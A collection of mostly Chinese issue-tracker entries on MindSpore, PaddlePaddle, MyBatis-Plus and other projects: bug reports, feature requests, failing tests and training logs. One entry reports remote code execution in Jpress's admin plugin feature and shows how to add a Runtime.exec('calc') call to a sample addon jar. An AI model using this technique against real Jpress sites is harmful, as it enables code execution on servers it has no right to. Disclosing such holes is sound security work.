关于AioSession中readFromChannel方法的疑问,"下面是AioSession.readFromChannel的代码片段，我的疑问是为什么在解码数据的动作，是放在状态判断的前面呢？ 按照我的理解，应该是在result &gt; 0，也就是读取到数据的时候，才进行解码操作的。   <code>: readBuffer.flip(); T dataEntry; //为什么在解码数据的动作，是放在状态判断的前面呢？？？ while ((dataEntry = ioServerConfig.getProtocol().decode(readBuffer, this, eof)) != null) { //处理消息 try { for (Plugin&lt;T&gt; h : ioServerConfig.getPlugins()) { h.process(this, dataEntry); } process(dataEntry); } catch (Exception e) { stateEvent(StateMachineEnum.PROCESS_EXCEPTION, e); for (Plugin&lt;T&gt; h : ioServerConfig.getPlugins()) { h.processFail(this, dataEntry, e); } } } //这里的状态判断是否在解码数据的动作之前，来进行判断是更加合理的呢？？？ if (eof || status == SESSION_STATUS_CLOSING) { close(false); stateEvent(StateMachineEnum.INPUT_SHUTDOWN, null); return; } if (status == SESSION_STATUS_CLOSED) { return; }"
 [新功能] 实现动态WebApi和集成Swagger文档,支持路由大小写控制   <code>: Swashbuckle.AspNetCore
[CT][MS][OCCM][SparseFillEmptyRows]  性能问题,"算子在gpu后端 运行用例test_sfer_200 x100_performance 出现精度误差 def test_sfer_200x100_performance(): indices = rand_index(100, 100, 200) values =Tensor(np.array(np.random.randn(100)),dtype=ms.float32) default_value = Tensor(np.random.randn(),dtype = ms.float32) dense = Tensor([100, 200], dtype=ms.int64) fact = SparseFillEmptyRowsMock(inputs=[indices, values, dense, default_value]) test_operations_sparsefillemptyrows.py:455: self = SparseFillEmptyRowsMock&lt;&gt; E AssertionError ../share/ops/primitive/sparse_fill_empty_rows_ops.py:177: AssertionError test_sfer_2000x10000_performance 用例通过   <code>: fact.forward_profile_cmp() def forward_profile_cmp(self): run_time = 10 net = SparseFillEmptyRows() op_name = ""SparseFillEmptyRows"" inputs = [self.indices, self.values, self.dense_shape, self.default_value] forward_profile_ms = self.mindspore_profile(net, run_time, op_name, *inputs) net_tf = tf.raw_ops.SparseFillEmptyRows op_name_tf = 'name: ""SparseFillEmptyRows""' indices_tf = self.indices_np value_tf = self.values_np dense_tf = self.dense_shape_np default_value_tf = self.default_value_np forward_profile_tf = self.tensorflow_forward_profile(net_tf, run_time, op_name_tf, indices=indices_tf, values=value_tf, dense_shape=dense_tf, default_value=default_value_tf) logger.info(""forward_profile_tf: {}us"".format(forward_profile_tf)) logger.info(""forward_profile_ms: {}us"".format(forward_profile_ms)) assert forward_profile_tf &gt;= 0.9 * forward_profile_ms"
Jpress后台插件允许远程代码执行,"0x01 生成恶意jar包 下载jpress项目 gitee地址： 添加恶意代码 打开 文件，并修改代码添加恶意代码如下： 0x03 解决方案 加强登录口令   <code>: https://gitee.com/JPressProjects/jpress.git jpress-addons-&gt;jpress-addons-helloword-&gt;src/main/java/io/jpress/addon/helloworld/HelloWorldAddonController.java try { Runtime.getRuntime().exec(""calc""); } catch (IOException e) { e.printStackTrace(); } jpress-addons-helloword"
Implement a bilinear initializer for transposed convolution.,"This is a common use case in transposed convolution to act as upsampling.   <code>: factor = 2 w_attr = ParamAttr(learning_rate=0., regularizer=L2Decay(0.), initializer=Bilinear()) conv_up = fluid.layers.conv2d_transpose( input, num_filters=C, output_size=None, filter_size=2 * factor - factor % 2, padding=ceil((factor - 1) / 2.), stride=factor, groups=C, param_attr=w_attr, bias_attr=False)"
【众智】【计算-用户接口】Outer,"Outer functional接口 计算向量x1与向量x2的外积。 functional接口（小写加下划线） 接口目录：mindspore/python/mindspore/ops/function/math_func.py 支持数据类型 PyTorch1.8.1接口： torch.outer https://pytorch.org/docs/1.8.1/generated/torch.outer.html 3. 异常处理 4. 算子反向 通过小算子拼接自动求解反向   <code>: def outer(x1: tensor, x2: tensor) -&gt; tensor: return y CPU：float16、float32、float64、uint8、int16、int32、int64 GPU：float16、float32、float64、int8、uint8、int16、int32、int64 Ascend：float16、float32、int8、uint8、int32、int64"
文件上传时，中文参数乱码,ContentType为的请求中，中文参数项乱码   <code>: multipart/form-data
Uniapp的小程序项目，如图，真机异步数据，图表会出现雷达,"Uniapp的小程序项目 在一个页面中，同时存在三种图表，一个是柱状图，一个是圆弧进度图，一个是圆环图，通过Promise异步获取3个接口的网络数据拼接好之后，再通过Object.assign()复制给三个图表，条状图和进度图的背景会出现雷达。真机会出现雷达，但是腾讯开发工具里面的模拟器不会出现，如下图所示： 5、图表背景出现雷达； 图表背景出现雷达 图表背景不能出现雷达   <code>: this.$nextTick(()=&gt;{}) this.sourceData=Object.assign({},source)"
FilterConfig.pageCachingFilter 编译报错！,The method setFilter(Filter) in the type FilterRegistrationBean is not applicable for the arguments (PageCachingFilter) 参数应该是Filter类型   <code>: bean.setFilter(pageCachingFilter);
python config parser重构之optimizer,"为了提供更加灵活的python使用方法，在之前的工作 #1108:Fix bug in DenseScanner of DataProviderConverter. 中，开始进行python api v2的开发工作，抽象出来了 layers，optimizer，data等组件。 之前的重构是对原有的config_parser.py 做了一层封装，对于这种封装的改造方式，王益老师的意见是： 之前我们讨论说先用目前的“不需要定义多个.py文件“的API把所有demo都重写一遍，然后再来看应该如何完善API。 但是我刚才又想了一下，是不是API里如果有一些明显的问题，可以先修正问题，然后再来重写mnist之后的下一个demo。这样效率更高？ 在写mnist的时候，我们不要 import * from 已有的Python packages，而是 已有的package 到 paddle.v2。这样我们就可以在”把mnist demo写得顾名思义“这个过程里，修改copy 过来的实现。当我们针对每个demo重复这个过程之后，我们是不是就得到了一个完备的v2 API了。 按着这种思路，在上述的几个组件中感觉optimizer这个组件相对比较独立，所以决定第一步先把optimizer和相关配置独立出来。 主要方案： 1，对外接口方面，在optimizer的基础上继续完善。 2，配置生成的方案，主要需要重构 settings 以及涉及到的 config_parser中的部分内容，主要需要做的是将这部分代码及相关代码，从config_parser中单独抽离出来，放到v2下，并且改变之前通过回调的生成配置的方式，直接生成对应的proto。 这样做的好处： 1，optimizer相对独立，且功能没有layer配置那么复杂，比较容易着手。 2，optimizer的部分从config_parser中独立出来之后，会简化后面重新定义layer和network部分的工作。 使用方式：   <code>: copy-n-paste optimizer = paddle.v2.Optimizer( learning_method=paddle.optimizer.AdamOptimizer(), learning_rate=1e-4, model_average=paddle.optimizer.ModelAverage(average_window=0.5), regularization=paddle.optimizer.L2Regularization(rate=0.5))"
[MS]Cast op trace code have problem.,": /device ascend : -- MindSpore version : master 2021/11/17 commit_id = ''[sha1]:f46208e2,[branch]:(HEAD-&gt;master,origin/master,origin/HEAD)'' -- Python version : Python3.7.5 -- OS platform and distribution : EulerOS 2.8 -- GCC/Compiler version : test_ms_usability_benchmark_precision_graph_code_map_resnet50_0001 copy models ResNet50 scripts. set save_graphs=True. execute train . check trace_code_graph file. some Cast op not have trace information. All Cast op have trace information 一些Cast算子缺少图码映射信息   <code>: %2(equiv[CNode]5464) = Cast(%1) primitive_attrs: {visited: true, pri_format: NC1HWC0, IsFeatureMapOutput: true, label_for_insert_stream_active: true, input_names: (x, dst_type), stream_id: 3, DstT: Float16, output_names: (output), dst_type: Float16, IsFeatureMapInputList: (0), SrcT: Float32, is_backed_cast: false} : (&lt;Tensor[Float32], (32, 3, 224, 224)&gt;) -&gt; (&lt;Tensor[Float16], (32, 3, 224, 224)&gt;) : (&lt;Float32xDefaultFormat[const vector][32, 3, 224, 224]&gt;) -&gt; (&lt;Float16xDefaultFormat[const vector][32, 3, 224, 224]&gt;) : (Default/network-TrainOneStepCell/network-WithLossCell/_backbone-ResNet/Cast-op12) %3(equivoutput) = TransData(%2) primitive_attrs: {stream_id: 3, visited: true, dst_format: NC1HWC0, IsFeatureMapInputList: (0), pri_format: NC1HWC0, _datadump_original_names: (), IsFeatureMapOutput: true, src_format: NCHW}"
 添加事件总线是否输出日志控制,默认情况下，事件总线在启动、停止或未找到事件处理程序的时会输出日志，但有些开发者不希望有这行为或希望能够提供配置。在过去虽可以通过 进行过滤，但不够简洁。 所以框架决定提供配置控制日志输出。 相关资料 编写更新日志内容 期望效果 日志 日志配置 !566: 添加事件总线是否输出日志控制   <code>: builder.Logging.AddFilter LogName LogName System.Logging.EventBusService services.AddEventBus(options =&gt; { options.LogEnabled = false; });
[ST][MS][NET][squeeze/squeeze residual][910/GPU 1p/8p]FPS[1534] can not reach 14200,"squeeze/squeeze residua网络在910/GPU环境训练，性能1534/fps达不到14200 / 硬件环境: /device ascend/GPU : -- MindSpore version :r1.8 commit_id:3232a15b -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C81/20220415 (/): /mode graph test_ms_model_zoo_squeeze_imagenet_train_check_fps_1p.py test_ms_model_zoo_squeeze_imagenet_train_check_loss_8p.py test_ms_model_zoo_squeeze_residual_imagenet_train_check_fps_1p.py test_ms_model_zoo_squeeze_residual_imagenet_train_check_loss_8p.py test_ms_squeezenet_cifar10_train_infer_gpu_8p_0001.py test_ms_squeezenet_imagenet2012_train_check_fps_gpu_0003.py test_ms_squeezenet_cifar10_train_check_fps_gpu_1p_0001.py get code from models start train 网络训练成功，性能精度达标 走给张慧耀   <code>: epoch time: 160874.771 ms, per step time: 321.750 ms epoch time: 84538.685 ms, per step time: 169.077 ms epoch time: 82675.778 ms, per step time: 165.352 ms epoch time: 85173.042 ms, per step time: 170.346 ms epoch time: 79553.553 ms, per step time: 159.107 ms epoch time: 83932.770 ms, per step time: 167.866 ms epoch time: 82012.039 ms, per step time: 164.024 ms epoch time: 84016.406 ms, per step time: 168.033 ms epoch time: 85643.276 ms, per step time: 171.287 ms epoch time: 80239.664 ms, per step time: 160.479 ms epoch time: 86331.012 ms, per step time: 172.662 ms"
ParallelExector Fetch两个名字一样的tensor，返回值异常,"” 1）PaddlePaddle版本： 1.3.0 2）CPU: 3）GPU： P40, CUDA Capability: 61, Driver API Version: 10.0, Runtime API Version: 9.0 4）系统环境：请您描述系统类型、版本，例如Mac OS 10.14，Python版本 Python 3.6.5 (default, Oct 23 2018, 10:54:02) [GCC 4.8.2] on linux 训练信息 1）单机/多机，单卡/多卡 单机单卡 2）显存信息 3）Operator信息 复现信息： 问题描述： Paralle Executor fetch两个名字一样的tensor scalar, 预期返回值的shape为[1,] [1,] 实际返回值的shape为 [2,] [2,] 屏幕输出：   <code>: import paddle import numpy as np import paddle.fluid as F import paddle.fluid.layers as L BS=50 DIM=128 SEQ=30 VOC=300000 train_program = F.Program() startup_prog = F.Program() with F.program_guard(train_program, startup_prog): with F.unique_name.guard(): inputs = L.data(name='inputs', shape=[SEQ, 1], dtype='int64') #inputs = L.data(name='inputs', shape=[DIM], dtype='float32') labels = L.data(name='labels', shape=[1], dtype='int64') emb = L.embedding(inputs, [VOC, DIM], param_attr=F.ParamAttr(name='emb', initializer=F.initializer.XavierInitializer(fan_in=VOC, fan_out=DIM))) emb = L.reduce_sum(emb, dim=1) emb = L.softsign(emb) emb = L.fc(emb, DIM) mm = L.matmul(emb, emb, transpose_y=True) / 10. loss = L.softmax_with_cross_entropy(logits=mm, label=labels) loss = L.reduce_mean(loss) F.optimizer.AdamOptimizer(0.001).minimize(loss) place = F.CUDAPlace(0) start_exe = F.Executor(place) #train_exe = F.Executor(place) exec_strategy = F.ExecutionStrategy() exec_strategy.num_threads = 1 exec_strategy.num_iteration_per_drop_scope = min(10, 1000) # important shit build_strategy = F.BuildStrategy() build_strategy.remove_unnecessary_lock = False train_exe = F.ParallelExecutor( use_cuda=True, loss_name=loss.name, build_strategy=build_strategy, exec_strategy=exec_strategy, main_program=train_program, num_trainers=1, trainer_id=0) start_exe.run(startup_prog) fake_input = np.random.randint(low=0, high=300000, size=[BS, SEQ, 1]).astype(np.int64) #fake_input = np.random.random([BS, DIM]).astype(np.float32) fake_label = np.expand_dims(np.array(range(BS), dtype=np.int64), -1) for i in range(10): print(paddle.__version__) print(loss.shape) loss_np, mm_np = train_exe.run(fetch_list=[loss.name, loss.name], feed={ 'inputs': fake_input, 'labels': fake_label }) print(loss_np, mm_np) W0319 16:40:05.176899 72214 device_context.cc:263] Please NOTE: device: 0, CUDA Capability: 61, Driver API Version: 10.0, Runtime API Version: 9.0 W0319 16:40:05.176970 72214 device_context.cc:271] device: 0, cuDNN Version: 7.0. W0319 16:40:05.176990 72214 device_context.cc:295] WARNING: device: 0. The installed Paddle is compiled with CUDNN 7.3, but CUDNN version in your machine is 7.0, which may cause serious incompatible bug. Please recompile or reinstall Paddle with compatible CUDNN version. 1.3.0 (1,) [3.9096315 3.9096315] [3.9096315 3.9096315] 1.3.0 (1,) [3.877936 3.877936] [3.877936 3.877936]"
[CT][MS][Feature] RuntimeError:  CalculateTiling] Calculate tiling failed,": /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : pytest -s test_rowtensor.py::test_row_tensor_with_sparse_optimizer_aicpu_adam   <code>: def test_row_tensor_with_sparse_optimizer_aicpu_adam(): fact = SparseFactory() &gt; out_sparse = fact.train_embedding_lookup_target_cpu_with_aicpu_sparse_optimizer_adam() [ERROR] TBE(177836,python3.7):2020-10-31-17:02:53.769.656 [ops/built-in/op_tiling/unsorted_segment_sum.cpp:890][OP_PROTO] UnsortedSegmentSumTiling:890 OpName:[UnsortedSegmentSum] ""front shape of input must be equal with ids shape"" [ERROR] DEVICE(177836,python3.7):2020-10-31-17:02:53.769.674 [mindspore/ccsrc/runtime/device/ascend/executor/tiling/op_tiling_calculater.cc:181] CalculateTiling] Calculate tiling failed [INFO] DEBUG(177836,python3.7):2020-10-31-17:02:53.769.692 [mindspore/ccsrc/debug/trace.cc:490] GetEvalStackInfo] Get graph analysis information begin [INFO] DEBUG(177836,python3.7):2020-10-31-17:02:53.769.705 [mindspore/ccsrc/debug/trace.cc:493] GetEvalStackInfo] Length of analysis information stack is empty. [EVENT] TDT(177836,python3.7):2020-10-31-17:02:54.086.388 [tdt/host/../common/src/log.cpp:148]""HostSendPool: {blockSize: 3072K, totalNum: 4, freeNum: 4}"" ""HostRecvPool: {blockSize: 3072K, totalNum: 1, freeNum: 1}"" ""DeviceRecvPool: "" ""HostCtrlPool: {SendPool: 4, FreePool: 4}, {RecvPool: 1, FreePool: 1}"",[tdt/host/../common/src/memory_pool.cpp:689:GetHostPoolStatus]177984 F def test_row_tensor_with_sparse_optimizer_aicpu_adam(): fact = SparseFactory() &gt; out_sparse = fact.train_embedding_lookup_target_cpu_with_aicpu_sparse_optimizer_adam() test_rowtensor.py:1368: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ test_rowtensor.py:524: in train_embedding_lookup_target_cpu_with_aicpu_sparse_optimizer_adam train_network(input, label) /root/archiconda3/envs/liwuxia_vm/lib/python3.7/site-packages/mindspore/nn/cell.py:291: in __call__ out = self.compile_and_run(*inputs) /root/archiconda3/envs/liwuxia_vm/lib/python3.7/site-packages/mindspore/nn/cell.py:554: in compile_and_run return _executor(self, *inputs, phase=self.phase) /root/archiconda3/envs/liwuxia_vm/lib/python3.7/site-packages/mindspore/common/api.py:474: in __call__ return self.run(obj, *args, phase=phase) /root/archiconda3/envs/liwuxia_vm/lib/python3.7/site-packages/mindspore/common/api.py:502: in run return self._exec_pip(obj, *args, phase=phase_real) /root/archiconda3/envs/liwuxia_vm/lib/python3.7/site-packages/mindspore/common/api.py:69: in wrapper results = fn(*arg, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._Executor object at 0xffff7d537910&gt; obj = TrainOneStepCell&lt; (network): WithLossCell&lt; (_backbone): EmbeddingLookUpBnNet&lt; (embedding_lookup): Embeddin...variance)&gt; (relu): ReLU&lt;&gt; &gt; (_loss_fn): SoftmaxCrossEntropyWithLogits&lt;&gt; &gt; (optimizer): Adam&lt;&gt; &gt; phase = '0train.1604134613912332288' args = (Tensor(shape=[3], dtype=Int32, value= [0, 1, 2]), Tensor(shape=[2, 3, 2, 2], dtype=Float32, value= [[[[ 1.00000000e+0... [ 1.00000000e+00, 1.00000000e+00]], [[ 1.00000000e+00, 1.00000000e+00], [ 1.00000000e+00, 1.00000000e+00]]]])) fn = &lt;bound method TrainOneStepCell.construct of TrainOneStepCell&lt; (network): WithLossCell&lt; (_backbone): EmbeddingLoo...ariance)&gt; (relu): ReLU&lt;&gt; &gt; (_loss_fn): SoftmaxCrossEntropyWithLogits&lt;&gt; &gt; (optimizer): Adam&lt;&gt; &gt;&gt; converted = True @_wrap_func def _exec_pip(self, obj, *args, phase=''): """"""Execute the generated pipeline."""""" fn = obj.construct converted, arguments_dict, parse_method = _convert_function_arguments(fn, *args) if not converted: raise RuntimeError('Process method parameter is failure') args_list = tuple(arguments_dict.values()) obj.__parse_method__ = parse_method &gt; return self._executor(args_list, phase) E RuntimeError: mindspore/ccsrc/runtime/device/ascend/executor/tiling/op_tiling_calculater.cc:181 CalculateTiling] Calculate tiling failed /root/archiconda3/envs/liwuxia_vm/lib/python3.7/site-packages/mindspore/common/api.py:485: RuntimeError"
报错 Unknown column 'SEARCH_FORMAT' in 'field list',"版本号： 1.3 创建数据   <code>: DROP TABLE IF EXISTS `banner`; CREATE TABLE `banner` ( `banner_id` int NOT NULL AUTO_INCREMENT COMMENT '轮播图ID', `title` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL DEFAULT NULL COMMENT '轮播图标题', `content` text CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL COMMENT '内容描述', `sort` int NULL DEFAULT 1 COMMENT '排序值', `path` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL DEFAULT NULL COMMENT '链接', `img` text CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL COMMENT '图片', `type` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL DEFAULT NULL COMMENT '类型', `create_time` datetime(0) NULL DEFAULT NULL COMMENT '创建时间', `create_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL DEFAULT NULL COMMENT '创建者', `update_time` datetime(0) NULL DEFAULT NULL COMMENT '更新时间', `update_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL DEFAULT NULL COMMENT '更新者', `status` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL DEFAULT '0' COMMENT '0-启用，1-禁用', PRIMARY KEY (`banner_id`) USING BTREE ) ENGINE = InnoDB AUTO_INCREMENT = 5 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_0900_ai_ci COMMENT = '轮播图表' ROW_FORMAT = DYNAMIC;"
[CT][MS][OP]linalg.cholesky some invalid value not check and err msg need optimize,": GPU/CPU /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 输入a shape 只支持2维方阵， 传3d时没有校验住 校验输入shape, 传3d时应该报错，并给出指导性信息   <code>: def test_cholesky_input_56x56x56_float32(): a = Tensor(np.random.randn(56, 56, 56), dtype=mstype.float32) fact = CholeskyMock( attributes={""a"": a, ""lower"": False, ""overwrite_a"": False, ""check_finite"": False}) with pytest.raises(ValueError): fact.forward_mindspore_impl() def test_cholesky_input_56x56x56_float32(): a = Tensor(np.random.randn(56, 56, 56), dtype=mstype.float32) fact = CholeskyMock( attributes={""a"": a, ""lower"": False, ""overwrite_a"": False, ""check_finite"": False}) with pytest.raises(ValueError): fact.forward_mindspore_impl() E Failed: DID NOT RAISE &lt;class 'ValueError'&gt;"
[CT][MS][OP]Asin report RuntimeError with dtype is float64 at ascend pynative mode,": Ascend+pynative /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 执行用例 ascend+pynative ， dtype是fp64时， 报错RuntimeError,具体信息如下： ascend图模式下是pass的， cpu上也是pass的 执行pass无异常   <code>: def test_asin_input_1x12x8x4x16x10x24_fp64(): def test_asin_input_20x7x13x9x88_fp64(): def test_asin_input_20x7x88_fp64(): fact = AsinFactory(input_shape=(20, 7, 88), dtype=np.float64) fact.forward_cmp() &gt; fact.grad_cmp() def test_asin_input_20x7x88_fp64(): fact = AsinFactory(input_shape=(20, 7, 88), dtype=np.float64) fact.forward_cmp() &gt; fact.grad_cmp() test_asin.py:123: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/asin_ops.py:72: in grad_cmp input_grad_mindspore = self.grad_mindspore_impl() ../share/ops/primitive/asin_ops.py:50: in grad_mindspore_impl input_grad = grad_net(input_ms, out_grad) /root/archiconda3/envs/caory_3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:483: in __call__ raise err /root/archiconda3/envs/caory_3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:480: in __call__ output = self.run_construct(cast_inputs, kwargs) /root/archiconda3/envs/caory_3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:363: in run_construct output = self.construct(*cast_inputs, **kwargs) ../share/grad.py:27: in construct return self.grad(self.network)(*inputs) /root/archiconda3/envs/caory_3.7/lib/python3.7/site-packages/mindspore/ops/composite/base.py:395: in after_grad return grad_(fn)(*args, **kwargs) /root/archiconda3/envs/caory_3.7/lib/python3.7/site-packages/mindspore/common/api.py:78: in wrapper results = fn(*arg, **kwargs) /root/archiconda3/envs/caory_3.7/lib/python3.7/site-packages/mindspore/ops/composite/base.py:384: in after_grad out = _pynative_executor(fn, *args, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._PynativeExecutor object at 0xffff9ae19450&gt;, obj = Asin&lt;&gt; args = (Tensor(shape=[20, 7, 88], dtype=Float64, value= [[[ 2.64771472e-01, 1.84741329e-01, 3.00367079e-01 ... 1.70422975e...5e-01], [-3.12819027e-01, 4.64458469e-01, -6.54240419e-01 ... 1.23265315e+00, 7.13418732e-01, 7.93989728e-01]]])) kwargs = {} def __call__(self, obj, *args, **kwargs): args = args + tuple(kwargs.values()) &gt; return self._executor(obj, args) E RuntimeError: mindspore/ccsrc/backend/session/ascend_session.cc:1734 SyncStream] Sync stream error! [ERROR] DEVICE(69583,fffe30ff91e0,python3.7):2021-11-17-14:49:02.062.226 [mindspore/ccsrc/runtime/device/ascend/ascend_kernel_runtime.cc:612] TaskFailCallback] Execute TaskFailCallback failed. task_fail_info or current_graph_ is nullptr [ERROR] DEVICE(69583,fffe30ff91e0,python3.7):2021-11-17-14:49:02.063.968 [mindspore/ccsrc/runtime/device/ascend/ascend_kernel_runtime.cc:612] TaskFailCallback] Execute TaskFailCallback failed. task_fail_info or current_graph_ is nullptr [ERROR] DEVICE(69583,fffe30ff91e0,python3.7):2021-11-17-14:49:02.064.057 [mindspore/ccsrc/runtime/device/ascend/ascend_kernel_runtime.cc:958] SyncStream] Call runtime rtStreamSynchronize error. [CRITICAL] SESSION(69583,fffe30ff91e0,python3.7):2021-11-17-14:49:02.064.072 [mindspore/ccsrc/backend/session/ascend_session.cc:1734] SyncStream] Sync stream error! [ERROR] SESSION(69583,fffe30ff91e0,python3.7):2021-11-17-14:49:02.064.265 [mindspore/ccsrc/backend/session/ascend_session.cc:1763] ReportErrorMessage] Ascend error occurred, error message: E39999: Inner Error! Aicpu kernel execute failed, device_id=3, stream_id=3, task_id=5, fault so_name=libaicpu_kernels.so, fault kernel_name=RunCpuKernel, fault op_name=, extend_info=[FUNC:GetError][FILE:stream.cc][LINE:712] Stream synchronize failed, stream = 0xfffe240a6640[FUNC:StreamSynchronize][FILE:logger.cc][LINE:285] rtStreamSynchronize execute failed, reason=[aicpu exception][FUNC:ReportFuncErrorReason][FILE:error_message_manage.cc][LINE:41]"
允许修改答案开启后更新不生效,"你可以试下，不清楚是不是我的问题   <code>: ts.DefaultSqlSession@5506e90d] 2022-06-08 11:07:16.087 [XNIO-1 task-2] ERROR c.s.s.c.m.a.GlobalExceptionHandler - handleErrorCodeError /api/public/saveAnswer errorCode=7020, errorMessage=答案更新失败"
【众智】【计算-AICPU接入】IsNan,AICPU算子接入 计算元素是否为Nan，返回布尔类型Tensor。 x y 对应底层算子 对应底层AICPU算子IsNan   <code>: class IsNan (Primitive):
枚举不能注入第二个value值吗,"当前使用版本 3.5.1 不应该结果是：高中 吗   <code>: @Getter public enum GradeEnum { /** * 年级信息 */ PRIMARY(1, ""小学""), SECONDORY(2, ""中学""), HIGH(3, ""高中""); // 通过@EnumValue注解，告诉Mybatis-Plus, 枚举类的真正的value是什么，同样也就实现了自由定制。 private final int code; @EnumValue private final String descp; GradeEnum(int code, String descp) { this.code = code; this.descp = descp; } } /** * 年级 */ private GradeEnum grade; @Test void gradeTest() { User user = User.builder() .name(""xyql"") .age(16) .email(""123@qq.com"") .grade(GradeEnum.HIGH) .build(); int i = userMapper.insert(user); System.out.println(""i = "" + i); }"
[ST][MS][NET][tinybert][GPU 8p]Core dump occurs during network training,"tinybert网络在GPU环境8p训练，训练到385个step时发生coredump / 硬件环境: /device GPU : -- MindSpore version :r1.8 commit_id:cc5359cb -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_model_zoo_tinybert_gd_check_loss_8p_gpu.py get code from models sh run_distributed_gd_gpu.sh 网络训练成功，性能精度达标 走给赖勇强   <code>: epoch: 385, step: 385, outputs are 19.637047 epoch time: 77.025 ms, per step time: 77.025 ms epoch: 385, step: 385, outputs are 18.625887 epoch time: 77.035 ms, per step time: 77.035 ms epoch: 385, step: 385, outputs are 18.495342 epoch time: 77.121 ms, per step time: 77.121 ms epoch time: 76.427 ms, per step time: 76.427 ms [CRITICAL] PRE_ACT(73156,7f7ab8ff9700,python):2022-05-11-10:05:37.235.724 [mindspore/ccsrc/common/mem_reuse/mem_dynamic_allocator.cc:86] AllocContinuousTensorMem] Can't find the device address[0x7f7903aace00]. [CRITICAL] PRE_ACT(73150,7f72ef7fe700,python):2022-05-11-10:05:37.235.877 [mindspore/ccsrc/common/mem_reuse/mem_dynamic_allocator.cc:86] AllocContinuousTensorMem] Can't find the device address[0x7f714faace00]. [CRITICAL] PRE_ACT(73152,7f057effd700,python):2022-05-11-10:05:37.236.140 [mindspore/ccsrc/common/mem_reuse/mem_dynamic_allocator.cc:86] AllocContinuousTensorMem] Can't find the device address[0x7f03cfaace00]. [CRITICAL] PRE_ACT(73151,7fe959ffb700,python):2022-05-11-10:05:37.237.512 [mindspore/ccsrc/common/mem_reuse/mem_dynamic_allocator.cc:86] AllocContinuousTensorMem] Can't find the device address[0x7fe7a3aace00]. [CRITICAL] PRE_ACT(73155,7f47bbfff700,python):2022-05-11-10:05:37.237.580 [mindspore/ccsrc/common/mem_reuse/mem_dynamic_allocator.cc:86] AllocContinuousTensorMem] Can't find the device address[0x7f4613aace00]. [CRITICAL] PRE_ACT(73149,7f859ffff700,python):2022-05-11-10:05:37.237.813 [mindspore/ccsrc/common/mem_reuse/mem_dynamic_allocator.cc:86] AllocContinuousTensorMem] Can't find the device address[0x7f8401aace00]. [CRITICAL] PRE_ACT(73153,7fc855ffb700,python):2022-05-11-10:05:37.238.399 [mindspore/ccsrc/common/mem_reuse/mem_dynamic_allocator.cc:86] AllocContinuousTensorMem] Can't find the device address[0x7fc6a1aace00]. [CRITICAL] PRE_ACT(73154,7f297a7fc700,python):2022-05-11-10:05:37.239.283 [mindspore/ccsrc/common/mem_reuse/mem_dynamic_allocator.cc:86] AllocContinuousTensorMem] Can't find the device address[0x7f27cdaace00]. terminate called after throwing an instance of 'std::runtime_error' what(): mindspore/ccsrc/common/mem_reuse/mem_dynamic_allocator.cc:86 AllocContinuousTensorMem] Can't find the device address[0x7f7903aace00]. terminate called after throwing an instance of 'std::runtime_error' terminate called after throwing an instance of 'std::runtime_error' what(): mindspore/ccsrc/common/mem_reuse/mem_dynamic_allocator.cc:86 AllocContinuousTensorMem] Can't find the device address[0x7f714faace00]. terminate called after throwing an instance of 'std::runtime_error' what(): mindspore/ccsrc/common/mem_reuse/mem_dynamic_allocator.cc:86 AllocContinuousTensorMem] Can't find the device address[0x7f4613aace00]. terminate called after throwing an instance of 'std::runtime_error' what(): mindspore/ccsrc/common/mem_reuse/mem_dynamic_allocator.cc:86 AllocContinuousTensorMem] Can't find the device address[0x7f03cfaace00]. terminate called after throwing an instance of 'std::runtime_error' what(): mindspore/ccsrc/common/mem_reuse/mem_dynamic_allocator.cc:86 AllocContinuousTensorMem] Can't find the device address[0x7fc6a1aace00]. terminate called after throwing an instance of 'std::runtime_error' what(): mindspore/ccsrc/common/mem_reuse/mem_dynamic_allocator.cc:86 AllocContinuousTensorMem] Can't find the device address[0x7f27cdaace00]. terminate called after throwing an instance of 'std::runtime_error' what(): mindspore/ccsrc/common/mem_reuse/mem_dynamic_allocator.cc:86 AllocContinuousTensorMem] Can't find the device address[0x7f8401aace00]. [10-90-54-164:73149] *** 